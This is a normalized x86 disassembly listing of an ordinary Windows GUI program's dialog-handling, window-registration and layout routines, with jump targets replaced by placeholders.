mov eax 0x1
pop ebx
add esp 0x1770
retn 0x10
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1770
retn 0x10
mov ebp [ esp + 0x178c ]
movzx eax bp
add eax 0xfffffb5f
cmp eax 0x8
ja r-xdata
mov ecx [ esp + 0x1784 ]
push ecx
call sub_4258e0
add esp 0x4
test esi esi
je r-xdata
sub eax 0x4c
jne r-xdata
push ebp
mov ecx esi
call sub_41c9b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1770
retn 0x10
jmp [ eax * 4 + jump_table_41f4e4 ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x1770
retn 0x10
mov ecx esi
call j_sub_41a9d0
push esi
call j_sub_429931
add esp 0x4
cmp [ esp + 0x178c ] 0x4a7
jne r-xdata
mov eax [ esp + 0x1784 ]
push eax
call sub_401da0
add esp 0x4
test eax eax
jne r-xdata
mov edi [ esp + 0x1784 ]
push 0x4a1
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x1784 ]
push 0x4a2
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov eax ebp
shr eax 0x10
cmp eax 0x300
jne r-xdata
mov eax [ esp + 0x1790 ]
push 0x4a6
push eax
call sub_41a890
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1770
retn 0x10
mov ecx [ eax + 0x4c ]
mov edx [ ecx + 0x10 ]
mov eax [ esi ]
mov bx [ edx ]
mov ecx esi
call [ eax + 0x4 ]
push 0x12c
push r--data
mov ecx esi
call sub_41b960
cmp eax 0xffffffff
mov [ esi + 0x15c ] eax
je r-xdata
push 0x30
call [ MessageBeep@IAT ]
push 0x0
push 0x4a2
push edi
call [ CheckDlgButton@IAT ]
push ebp
mov ecx esi
call sub_41c9b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1770
retn 0x10
push 0x0
push 0x4a1
push edi
call [ CheckDlgButton@IAT ]
push ebp
mov ecx esi
call sub_41c9b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1770
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1770
retn 0x10
mov edi [ esp + 0x1784 ]
push 0x0
push 0x0
push 0x4a6
push edi
call [ GetDlgItemInt@IAT ]
neg eax
sbb eax eax
inc eax
push eax
push 0x4a0
push edi
call [ CheckDlgButton@IAT ]
xor edi edi
lea ebx [ ebx ]
cmp ecx eax
je r-xdata
cmp [ esp + ecx * 2 + 0x10 ] bx
je r-xdata
inc edi
cmp edi 0xf1
jle r-xdata
push edi
mov ecx esi
call sub_41cc40
inc ecx
cmp ecx eax
jl r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push edi
mov ecx esi
call sub_41b8e0
xor ecx ecx
test eax eax
jle r-xdata
mov edx [ esi + 0x15c ]
push edx
call [ CloseHandle@IAT ]
push ebp
mov ecx esi
call sub_41c9b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1770
retn 0x10
sub_41f510
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
push ebp
push esi
push edi
mov ebp ecx
ja r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x10
mov ebx [ esp + 0x1c ]
movzx eax bx
sub eax 0x2
je r-xdata
mov esi [ esp + 0x14 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x1e
push 0x0
push 0x465
push 0x4a7
push esi
call edi
mov ebx rw-data
lea ebx [ ebx ]
sub eax 0x2
je r-xdata
mov esi [ esp + 0x14 ]
push 0x0
push 0x0
push 0x147
push 0x640
push esi
call [ SendDlgItemMessageA@IAT ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x641
push esi
mov [ rw-data ] al
call edi
push 0x643
push esi
mov [ rw-data ] al
call edi
mov [ rw-data ] al
sub eax 0x4a4
jne r-xdata
mov edx [ ebx ]
push edx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x640
push esi
call edi
add ebx 0x4
cmp ebx rw-data
jl r-xdata
test [ rw-data ] 0x4
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_4258e0
add esp 0x4
test ebp ebp
je r-xdata
sub eax 0x51
jne r-xdata
push ebx
mov ecx ebp
call sub_41c9b0
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
mov ecx ebx
shr ecx 0x10
cmp ecx 0x300
je r-xdata
test [ rw-data ] 0x1
je r-xdata
push 0x134
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x640
push esi
call edi
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
retn 0x10
mov ecx ebp
call j_sub_4198b0
push ebp
call j_sub_429931
add esp 0x4
mov eax [ esp + 0x14 ]
push 0x614
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x10
test [ rw-data ] 0x2
je r-xdata
push 0x135
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x640
push esi
call edi
movzx eax [ rw-data ]
push 0x0
push eax
push 0x14e
push 0x640
push esi
call edi
cmp eax 0xffffffff
jne r-xdata
push 0x136
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x640
push esi
call edi
movzx ecx [ rw-data ]
mov ebx [ CheckDlgButton@IAT ]
push ecx
push 0x641
push esi
call ebx
movzx edx [ rw-data ]
push edx
push 0x643
push esi
call ebx
push 0x642
push 0x0
push esi
mov ecx ebp
call sub_41a330
mov eax [ esp + 0x20 ]
push eax
push 0x0
push 0x405
push 0x642
push esi
call edi
push 0x0
push 0x0
push 0x402
push 0x642
push esi
call edi
mov [ ebp + 0x44 ] eax
push 0x0
push 0x0
push 0x14e
push 0x640
push esi
call edi
sub_41f760
mov eax [ esp + 0x8 ]
sub esp 0x268
cmp eax 0x110
push ebx
push esi
mov ebx ecx
ja r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x268
retn 0x10
mov esi [ esp + 0x27c ]
movzx eax si
cmp eax 0x5f2
jg r-xdata
mov esi [ esp + 0x274 ]
push edi
push esi
lea ecx [ esp + 0x10 ]
mov [ esp + 0x270 ] 0xffffffff
call sub_415ea0
lea ecx [ esp + 0xc ]
call sub_415190
mov edi [ SendDlgItemMessageA@IAT ]
push 0x4
push 0x0
push 0x465
push 0x5f1
push esi
call edi
push 0x14
push 0x0
push 0x465
push 0x5f3
push esi
call edi
push 0x18
push 0x0
push 0x465
push 0x5f5
push esi
call edi
movzx edx [ rw-data ]
push edx
push 0x5f6
push esi
call [ CheckDlgButton@IAT ]
test [ rw-data ] 0x20
pop edi
jne r-xdata
sub eax 0x2
je r-xdata
sub eax 0x5f4
je r-xdata
je r-xdata
push 0x5f0
push 0x1
push esi
mov ecx ebx
call sub_41a330
push 0x0
push 0x5f6
push esi
mov [ rw-data ] 0x0
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
mov ecx [ esp + 0x274 ]
push ecx
call sub_4258e0
add esp 0x4
test ebx ebx
je r-xdata
sub eax 0x51
jne r-xdata
mov eax esi
shr eax 0x10
cmp eax 0x300
jne r-xdata
sub eax 0x3
jne r-xdata
sub eax 0x2
je r-xdata
pop esi
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x268
retn 0x10
mov ecx ebx
call j_sub_4198b0
push ebx
call j_sub_429931
add esp 0x4
mov eax [ esp + 0x274 ]
push 0x615
push eax
call sub_414bc0
add esp 0x8
pop esi
mov eax 0x1
pop ebx
add esp 0x268
retn 0x10
push esi
mov ecx ebx
call sub_41c9b0
pop esi
pop ebx
add esp 0x268
retn 0x10
mov ecx [ esp + 0x280 ]
push ecx
push 0x5f0
mov ecx ebx
call sub_41a840
mov edx [ esp + 0x274 ]
push 0x5f2
push edx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
push esi
mov ecx ebx
call sub_41c9b0
pop esi
pop ebx
add esp 0x268
retn 0x10
mov eax [ esp + 0x274 ]
push 0x5f6
push eax
call [ IsDlgButtonChecked@IAT ]
push esi
mov ecx ebx
mov [ rw-data ] al
call sub_41c9b0
pop esi
pop ebx
add esp 0x268
retn 0x10
sub eax 0x5ee
jne r-xdata
sub_41f980
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
mov esi ecx
jg r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
xor eax eax
pop esi
retn 0x10
movzx eax [ esp + 0x10 ]
cmp eax 0x4bd
jg r-xdata
push edi
mov edi [ esp + 0xc ]
push 0x1
push edi
mov [ esi ] edi
call sub_4258a0
add esp 0x8
call sub_4148e0
push 0x4c0
push edi
mov [ esi + 0x4 ] eax
call [ GetDlgItem@IAT ]
mov ecx [ esi + 0x4 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x14 ] 0x0
mov edx [ ecx ]
push 0x2223
call [ edx + 0x8 ]
push 0x0
push 0x2421
mov ecx esi
mov [ esi + 0x10 ] eax
call sub_41d870
pop edi
mov eax 0x1
pop esi
retn 0x10
sub eax 0x2
je r-xdata
sub eax 0x4be
je r-xdata
je r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call sub_4258e0
push esi
call j_sub_429931
add esp 0x8
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
retn 0x10
sub eax 0x51
jne r-xdata
movzx ecx [ esi + 0x8 ]
mov edx [ esp + 0x8 ]
push ecx
push edx
call sub_416da0
add esp 0x8
dec eax
je r-xdata
push 0x4bd
mov ecx esi
call sub_41c860
mov ecx [ esi + 0x14 ]
test ecx ecx
jne r-xdata
cmp eax 0x4bb
jg r-xdata
mov eax [ esp + 0x8 ]
push 0x607
push eax
call sub_414bc0
add esp 0x8
mov eax 0x1
pop esi
retn 0x10
push 0x0
mov ecx rw-data
call sub_40d9b0
push 0x1
add esi 0x8
push esi
mov ecx eax
call sub_4107e0
mov eax 0x1
pop esi
retn 0x10
sub eax 0x2
je r-xdata
mov eax 0x1
pop esi
retn 0x10
push 0x4bd
push eax
push eax
call sub_418960
add esp 0x8
push eax
mov ecx esi
call sub_41d870
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x4bc
jne r-xdata
je r-xdata
xor ecx ecx
call sub_401bd0
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
test eax eax
jle r-xdata
push 0x1
add esi 0x8
push esi
mov ecx eax
call sub_40ee50
mov eax 0x1
pop esi
retn 0x10
push 0x4bc
push 0x4bc
mov ecx esi
call sub_41c860
push eax
call sub_418920
add esp 0x4
push eax
mov ecx esi
call sub_41d870
mov eax 0x1
pop esi
retn 0x10
push 0x4bb
push 0x4bb
mov ecx esi
call sub_41c860
and eax 0x7f7f
push eax
mov ecx esi
call sub_41d870
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x2
jle r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ DestroyWindow@IAT ]
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x4ba
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
push 0x4ba
push 0x4ba
mov ecx esi
call sub_41c860
push eax
mov ecx esi
call sub_41d870
mov eax 0x1
pop esi
retn 0x10
sub_41fbe0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x1
jne r-xdata
push 0x0
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push edi
push esi
mov ecx eax
call sub_41e070
pop edi
pop esi
retn 0x10
mov eax [ rw-data ]
push eax
push 0x0
push esi
call [ SetWindowLongA@IAT ]
sub_41fc30
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x160
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
push 0x1
push 0xbb8
mov ecx esi
call sub_41cb10
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_41fc20
push ecx
push 0x3ac
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_41fd10
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x88
call sub_42991a
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor eax eax
mov ecx eax
call sub_41b020
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_41fd00
push ecx
push 0x3b2
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
test eax eax
mov [ esp + 0xc ] 0xffffffff
mov [ rw-data ] eax
jne r-xdata
sub_41fde0
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x50
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
mov ecx esi
call sub_41a150
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_41fdd0
push ecx
push 0x3ab
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_41fec0
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x88
call sub_42991a
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor eax eax
mov ecx eax
call sub_41b400
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_41feb0
push ecx
push 0x3b1
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
test eax eax
mov [ esp + 0xc ] 0xffffffff
mov [ rw-data ] eax
jne r-xdata
sub_41ff90
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x4c
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
mov ecx esi
call sub_41a150
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_41ff80
push ecx
push 0x3ae
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_420070
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x160
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
push 0x0
push 0xbb8
mov ecx esi
call sub_41cb10
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_420060
push ecx
push 0x395
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_420150
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x4c
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ eax + 0x40 ]
push ecx
push 0x0
push 0x405
push 0x642
push edx
call [ SendDlgItemMessageA@IAT ]
mov eax [ rw-data ]
mov ecx [ eax + 0x40 ]
push ecx
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
mov ecx esi
call sub_41a150
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push eax
push sub_420140
push ecx
push 0x3b0
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x8 ]
push eax
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_420250
push 0xffffffff
push sub_431d8b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push 0x4c
call sub_42991a
mov esi eax
add esp 0x4
mov [ esp + 0x4 ] esi
test esi esi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
xor esi esi
mov ecx esi
call sub_41a150
mov [ esi ] r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_420240
push ecx
push 0x3aa
call sub_420cd0
mov ecx [ esp + 0x14 ]
add esp 0x10
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x8 ]
push edx
call sub_420ef0
add esp 0x4
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] esi
test esi esi
mov [ esp + 0x10 ] 0xffffffff
pop esi
jne r-xdata
sub_420330
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x18
call sub_42991a
add esp 0x4
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ eax ]
push eax
call [ SetForegroundWindow@IAT ]
retn
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
push 0x0
push sub_420320
push ecx
push 0x391
call sub_420cd0
add esp 0x10
retn
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ esp + 0x4 ] edx
jmp sub_420ef0
sub_420390
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ RegisterClassA@IAT ]
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] sub_41c950
mov [ esi + 0x1c ] 0x6
mov [ esi + 0x24 ] r--data
call edi
test ax ax
jne r-xdata
push esi
mov [ esi ] 0x3
mov [ esi + 0x4 ] r-xdata
mov [ esi + 0x1c ] 0x10
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
push esi
mov [ esi ] 0x3
mov [ esi + 0x4 ] sub_41b1f0
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] sub_41fbe0
mov [ esi + 0x1c ] 0xd
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] r-xdata
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] sub_41f970
mov [ esi + 0x24 ] r--data
call edi
neg ax
pop edi
pop esi
sbb eax eax
inc eax
retn
sub_4204e0
push ecx
push esi
push edi
mov esi ecx
call sub_420470
mov edi [ esp + 0x10 ]
push 0x2
lea eax [ esp + 0xc ]
push eax
mov ecx edi
call sub_401380
test eax eax
je r-xdata
mov ax [ esp + 0x8 ]
test ax ax
jg r-xdata
pop edi
mov eax 0x1
pop esi
pop ecx
retn 0x4
movsx ecx ax
inc ecx
push 0x2
push ecx
call sub_429969
add esp 0x8
test eax eax
mov [ esi ] eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn 0x4
movsx edx [ esp + 0x8 ]
shl edx 0x1
push edx
push eax
mov ecx edi
call sub_401380
neg eax
sbb eax eax
pop edi
neg eax
pop esi
pop ecx
retn 0x4
sub_420550
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
je r-xdata
pop edi
pop esi
retn 0x8
push ebx
mov ebx [ esp + 0x14 ]
cmp ebx 0xffffffff
jne r-xdata
lea eax [ ebx + 0x1 ]
push 0x2
push eax
call sub_429969
add esp 0x8
test eax eax
mov [ edi ] eax
je r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
pop ebx
lea ecx [ ebx + ebx ]
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ecx ]
inc ebx
cmp [ esi + ebx * 2 ] 0x0
jne r-xdata
sub_4205d0
push ecx
push esi
push edi
mov esi ecx
call sub_420490
mov edi [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
push 0x2
lea eax [ esp + 0xc ]
push eax
mov ecx edi
call sub_4011e0
mov eax [ esp + 0x8 ]
test ax ax
jle r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn 0x4
mov edx [ esi ]
movsx ecx ax
shl ecx 0x1
push ecx
push edx
mov ecx edi
call sub_4011e0
sub_420640
sub esp 0x20
push edi
mov edi ecx
cmp [ edi ] 0x0
je r-xdata
pop edi
add esp 0x20
retn
mov ecx [ edi + 0x24 ]
push ebx
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
movsx ebx [ edi ]
movsx edx [ edi + 0x2 ]
cmp ebx edx
jg r-xdata
pop ebx
push ebp
mov ebp [ EnableWindow@IAT ]
push esi
push 0x0
push esi
call ebp
push 0x0
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x28 ]
jge r-xdata
mov eax [ edi + 0x24 ]
push ebx
push eax
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x10 ]
mov esi eax
push ecx
push esi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax ecx
sub eax edx
cdq
sub eax edx
mov edx [ esp + 0x2c ]
sar eax 0x1
sub edx eax
cmp ecx edx
jge r-xdata
pop esi
pop ebp
push 0x1
push esi
call ebp
push 0x5
jmp r-xdata
push esi
call [ ShowWindow@IAT ]
movsx ecx [ edi + 0x2 ]
inc ebx
cmp ebx ecx
jle r-xdata
sub_4206e0
mov al [ esp + 0x10 ]
sub esp 0x10
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ GetDlgItem@IAT ]
push esi
mov esi ecx
mov ecx [ esp + 0x24 ]
push edi
push ecx
push ebx
mov [ esi + 0x4 ] al
mov [ esi + 0x24 ] ebx
call ebp
mov cx [ esp + 0x34 ]
mov edx [ esp + 0x2c ]
mov edi [ GetWindowRect@IAT ]
mov [ esi ] cx
lea ecx [ esp + 0x10 ]
mov [ esi + 0x8 ] edx
mov dx [ esp + 0x38 ]
push ecx
push eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x2 ] dx
call edi
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
sub edx eax
mov eax [ esp + 0x1c ]
sub eax ecx
lea ecx [ esp + 0x10 ]
mov [ esi + 0x14 ] edx
mov edx [ esi + 0x24 ]
push ecx
push edx
mov [ esi + 0x18 ] eax
call edi
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
sub eax ecx
mov ecx [ esp + 0x1c ]
sub ecx edx
lea edx [ esp + 0x10 ]
push edx
push 0x1
push ebx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ecx
call ebp
push eax
call edi
mov ecx esi
call sub_420640
mov eax [ esp + 0x14 ]
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x18
mov eax [ esi + 0x8 ]
mov edx [ eax + 0x8 ]
mov edi [ esi + 0xc ]
cmp edx edi
jl r-xdata
mov ecx [ eax + 0xc ]
mov esi [ esi + 0x10 ]
cmp ecx esi
jl r-xdata
cmp edx edi
jg r-xdata
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
push ebx
call [ MoveWindow@IAT ]
cmp ecx esi
jle r-xdata
sub_4207d0
sub esp 0x10
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop esi
add esp 0x10
retn
mov ecx [ esi + 0x24 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edx [ esi + 0x8 ]
mov eax [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esi + 0x8 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x4 ] edx
sub_420810
mov eax [ esp + 0x4 ]
sub esp 0x20
cmp eax 0x1
push esi
mov esi ecx
je r-xdata
pop esi
add esp 0x20
retn 0x4
mov ecx [ esi + 0x24 ]
push ebx
mov ebx [ GetWindowRect@IAT ]
push ebp
push edi
lea eax [ esp + 0x10 ]
push eax
push ecx
call ebx
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
mov edx [ esp + 0x18 ]
sub edx [ esp + 0x10 ]
mov [ edi + 0x8 ] edx
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
sub eax ecx
mov [ edi + 0xc ] eax
mov ecx [ esp + 0x10 ]
mov [ edi ] ecx
mov edx [ esp + 0x14 ]
mov ecx esi
mov [ edi + 0x4 ] edx
call sub_420640
mov ecx [ esi + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call ebx
mov eax [ esi + 0x10 ]
mov edx [ esi + 0x18 ]
mov ebp [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
mov ebx [ GetSystemMetrics@IAT ]
sub edx eax
mov eax [ esi + 0x14 ]
push 0x1
